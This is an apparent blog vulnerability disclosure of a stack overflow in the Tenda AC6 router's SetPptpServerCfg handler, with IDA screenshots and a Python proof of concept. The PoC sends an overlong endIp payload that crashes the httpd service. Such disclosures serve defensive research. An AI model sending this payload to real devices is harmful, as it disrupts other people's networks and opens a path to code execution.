<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="AC6_Stack_overflowDescribe​    The vulnerability lies in the setting of PPTP service &#x2F; goform &#x2F; setpptpservercfg in Tenda AC6 httpd component. If the length of startip and endip parameters i">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2021/09/16/AC6_Stack_overflow/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="AC6_Stack_overflowDescribe​    The vulnerability lies in the setting of PPTP service &#x2F; goform &#x2F; setpptpservercfg in Tenda AC6 httpd component. If the length of startip and endip parameters i">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2021/09/16/AC6_Stack_overflow/img/image-20210916182726736.png">
<meta property="og:image" content="http://example.com/2021/09/16/AC6_Stack_overflow/img/image-20210916183154601.png">
<meta property="og:image" content="http://example.com/2021/09/16/AC6_Stack_overflow/img/image-20210916183755046.png">
<meta property="og:image" content="http://example.com/2021/09/16/AC6_Stack_overflow/img/image-20210916183819454.png">
<meta property="og:image" content="http://example.com/2021/09/16/AC6_Stack_overflow/img/image-20210916184146710.png">
<meta property="og:image" content="http://example.com/2021/09/16/AC6_Stack_overflow/img/image-20210916184102459.png">
<meta property="article:published_time" content="2021-09-16T10:31:16.215Z">
<meta property="article:modified_time" content="2021-11-09T02:58:43.637Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2021/09/16/AC6_Stack_overflow/img/image-20210916182726736.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-AC6_Stack_overflow" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/09/16/AC6_Stack_overflow/" class="article-date">
  <time class="dt-published" datetime="2021-09-16T10:31:16.215Z" itemprop="datePublished">2021-09-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="AC6-Stack-overflow"><a href="#AC6-Stack-overflow" class="headerlink" title="AC6_Stack_overflow"></a>AC6_Stack_overflow</h1><h4 id="Describe"><a href="#Describe" class="headerlink" title="Describe"></a>Describe</h4><p>​    The vulnerability lies in the setting of PPTP service &#x2F; goform &#x2F; setpptpservercfg in Tenda AC6 httpd component. If the length of startip and endip parameters is not well limited, it will lead to stack overflow.</p>
<h4 id="Detail"><a href="#Detail" class="headerlink" title="Detail"></a>Detail</h4><p>​    Https form formSetPPTPServer fuction in IDA view</p>
<img src="./img/image-20210916182726736.png" alt="image-20210916182726736" style="zoom:50%;" />

<img src="./img/image-20210916183154601.png" alt="image-20210916183154601" style="zoom:50%;" />

<p>​    Due to the pointer defined in the function, the values of the startip parameter and endip parameter will be stored on the stack, and the length is not limited, resulting in a vulnerability</p>
<h4 id="TEST"><a href="#TEST" class="headerlink" title="TEST"></a>TEST</h4><img src="./img/image-20210916183755046.png" alt="image-20210916183755046" style="zoom:50%;" />

<p>​        Grab HTTP packets</p>
<img src="./img/image-20210916183819454.png" alt="image-20210916183819454" style="zoom:50%;" />

<pre><code> Parameterize request 
</code></pre>
<img src="./img/image-20210916184146710.png" alt="image-20210916184146710" style="zoom:50%;" />

<p>​    can see the service crash</p>
<img src="./img/image-20210916184102459.png" alt="image-20210916184102459" style="zoom:50%;" />



<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.0.1/goform/SetPptpServerCfg&quot;</span><br><span class="line">payload = &quot;a&quot;*0x9c+&quot;bbbb&quot;</span><br><span class="line">data=&#123;</span><br><span class="line">	&quot;serverEn&quot;:&quot;1&quot;,</span><br><span class="line">	&quot;startIp&quot;:&quot;100.0.0.100&quot;,</span><br><span class="line">	&quot;endIp&quot;:&quot;100.0.0.200&quot;+payload,</span><br><span class="line">	&quot;mppe&quot;:&quot;1&quot;,</span><br><span class="line">	&quot;mppeOp&quot;:&quot;40&quot;</span><br><span class="line">&#125;</span><br><span class="line">headers=&#123;</span><br><span class="line">	&quot;Host&quot;:&quot;192.168.0.1&quot;,</span><br><span class="line">	&quot;User-Agent&quot;:&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;,</span><br><span class="line">	&quot;Accept&quot;:&quot;*/*&quot;,</span><br><span class="line">	&quot;Accept-Language&quot;:&quot;en-US,en;q=0.5&quot;,</span><br><span class="line">	&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,</span><br><span class="line">	&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,</span><br><span class="line">	&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,</span><br><span class="line">	&quot;Origin&quot;:&quot;http://192.168.0.1&quot;,</span><br><span class="line">	&quot;Referer&quot;:&quot;http://192.168.0.1/pptp_server.html?random=0.7706434999271096&amp;&quot;,</span><br><span class="line">	&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;</span><br><span class="line">&#125;</span><br><span class="line">response = requests.request(&quot;POST&quot;, url, headers=headers, data=data)</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/09/16/AC6_Stack_overflow/" data-id="ckzveg5jn0000vsxl0ge6a639" data-title="" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
    
  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/09/16/AC6_Stack_overflow/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>